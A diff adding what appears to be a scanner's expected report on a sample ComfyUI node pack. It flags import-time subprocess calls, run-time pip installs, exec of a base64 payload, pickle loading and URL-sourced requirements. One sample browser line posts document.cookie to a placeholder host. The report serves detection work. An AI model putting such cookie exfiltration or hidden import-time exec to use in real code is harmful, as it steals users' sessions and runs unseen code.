@@ -1,0 +1,33 @@
+== suspicious_pack: 4 files, 2 Python, 1 JavaScript, web folder: yes
+   autorun            3  file that runs without being asked
+                        __init__.py  imported by ComfyUI at every start
+                        install.py  run by ComfyUI-Manager after install and update
+                        requirements.txt  installed with pip by ComfyUI-Manager
+   subprocess         3  starts a process (subprocess, os.system, os.popen, os.exec*)
+                        __init__.py:9  sp.run([__import__("sys").executable, "-m", "pip", "install", "example-package"])
+                        __init__.py:23  sp.call("echo only when run as a script", shell=True)
+                        install.py:3  os.system("echo install.py runs when ComfyUI-Manager installs the pack")
+   pip-runtime        1  installs packages at run time (pip install from code)
+                        __init__.py:9  sp.run([__import__("sys").executable, "-m", "pip", "install", "example-package"])
+   eval-exec          1  evaluates code from a string (eval, exec, compile)
+                        __init__.py:11  exec(PAYLOAD)
+   obfuscation        1  decodes data that may be code (base64, zlib, marshal)
+                        __init__.py:10  PAYLOAD = base64.b64decode("cHJpbnQoJ2hlbGxvJyk=")
+   pickle             1  unpickles data (pickle, dill, joblib, torch.load with weights_only=False, numpy allow_pickle=True)
+                        __init__.py:17  legacy = torch.load(path, weights_only=False)
+   torch-load         1  torch.load without weights_only: restricted by default since PyTorch 2.6, full pickle before
+                        __init__.py:16  state = torch.load(path)
+   network            1  network call (urllib, requests, httpx, aiohttp client, socket)
+                        __init__.py:12  CONFIG = urlopen("https://example.invalid/config.json").read()
+   import-time        4  one of the calls above sits outside any function: it runs as soon as the file is imported or run
+                        __init__.py:9  [subprocess] sp.run([__import__("sys").executable, "-m", "pip", "install", "example-package"])
+                        __init__.py:11  [eval-exec] exec(PAYLOAD)
+                        __init__.py:12  [network] CONFIG = urlopen("https://example.invalid/config.json").read()
+                        install.py:3  [subprocess] os.system("echo install.py runs when ComfyUI-Manager installs the pack")
+   requirement-url    2  requirement installed from a URL, a git repository, a local wheel or another index
+                        requirements.txt:2  example-wheel @ https://example.invalid/example_wheel-1.0-py3-none-any.whl
+                        requirements.txt:3  git+https://example.invalid/example/repo.git
+   js-network         1  browser code calling fetch, WebSocket or EventSource on an absolute URL, or XMLHttpRequest
+                        web/extension.js:4  await fetch("https://example.invalid/collect", { method: "POST", body: document.cookie });
+   js-eval            1  browser code evaluating a string as code (eval, new Function)
+                        web/extension.js:5  new Function("return 1")();
